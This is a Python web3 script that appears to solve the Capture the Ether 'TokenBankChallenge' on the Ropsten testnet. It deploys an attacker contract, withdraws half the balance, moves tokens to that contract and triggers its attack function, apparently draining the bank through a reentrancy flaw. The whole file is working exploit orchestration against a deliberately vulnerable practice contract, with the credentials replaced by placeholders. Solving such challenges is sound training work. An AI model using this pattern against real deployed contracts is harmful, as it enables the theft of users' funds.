from web3 import Web3, HTTPProvider
import urllib3
from solc import compile_source

urllib3.disable_warnings()
web3 = Web3(HTTPProvider('https://ropsten.infura.io/xxxxxxxxxxxxxxxxx', {'verify': False}))

private_key = '0x00000000000000000'
account = web3.eth.account.privateKeyToAccount(private_key)
web3.eth.defaultAccount = account.address

challenge_contract_address = '0x000000000000'
with open('solver.sol', 'r') as f:
    contract_source_code = f.read()

compiled = compile_source(contract_source_code, allow_paths='.')
compiled_sol = compiled['<stdin>:TokenBankChallengeSolver']
bank_challenge_abi = compiled['challenge.sol:TokenBankChallenge']['abi']
token_abi = compiled['challenge.sol:SimpleERC223Token']['abi']

def send_transaction_sync(tx, args={}):
    args['nonce'] = web3.eth.getTransactionCount(account.address)
    signed_txn = account.signTransaction(tx.buildTransaction(args))
    tx_hash = web3.eth.sendRawTransaction(signed_txn.rawTransaction)
    return web3.eth.waitForTransactionReceipt(tx_hash)


contract = web3.eth.contract(
    abi=compiled_sol['abi'],
    bytecode=compiled_sol['bin'])

print('Deploying contract...')
tx = contract.constructor(challenge_contract_address)
tx_contract_receipt = send_transaction_sync(tx)
solver_address = tx_contract_receipt.contractAddress
print('Contract deployed')

solver_contract = web3.eth.contract(abi=compiled_sol['abi'], address=solver_address)
challenge_contract = web3.eth.contract(abi=bank_challenge_abi, address=challenge_contract_address)
token_contract_address = challenge_contract.functions.token().call()
token_contract = web3.eth.contract(abi=token_abi, address=token_contract_address)

half_of_balance = 10**18 * 500000

print('Withdraw my balance...')
tx = challenge_contract.functions.withdraw(half_of_balance)
send_transaction_sync(tx, {'gas': 3000000})
print('Withdraw done!')

print('Send my balance to solver...')
tx = token_contract.functions.transfer(solver_address, half_of_balance)
send_transaction_sync(tx, {'gas': 3000000})
print('Balance sent!')

print('Attacking...')
tx = solver_contract.functions.attack(half_of_balance)
send_transaction_sync(tx, {'gas': 3000000})
print('Attack done!')

print('Solved')
